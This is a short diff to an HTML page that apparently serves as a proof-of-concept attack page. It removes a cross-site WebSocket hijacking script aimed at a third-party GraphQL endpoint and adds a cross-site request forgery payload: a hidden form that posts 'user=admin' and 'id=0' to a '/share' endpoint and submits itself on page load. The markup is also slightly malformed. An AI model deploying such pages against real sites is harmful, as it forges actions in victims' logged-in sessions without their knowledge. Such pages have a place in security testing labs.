@@ -2,15 +2,13 @@
 <head>
 <title> </title>
 </heady>
-<body>
-<script>
-websocket = new WebSocket('wss://graphql.beta.shapeshift.com/')
-websocket.onopen = start
-function start(event) {
-  websocket.send("this message is sent by the attacker");
-}
 
-</script>
   <h1> Simple Page </h1>
+  <body onload="document.forms[0].submit()">
+   <form action="http://ptl-b26dda11-ee7e7321.libcurl.so/share" method="POST">
+     <input type="hidden" name="user" value="admin"/>
+     <input type="hidden" name="id" value="0"/>
+   </form>
+ </body>
   </body>
 </html>
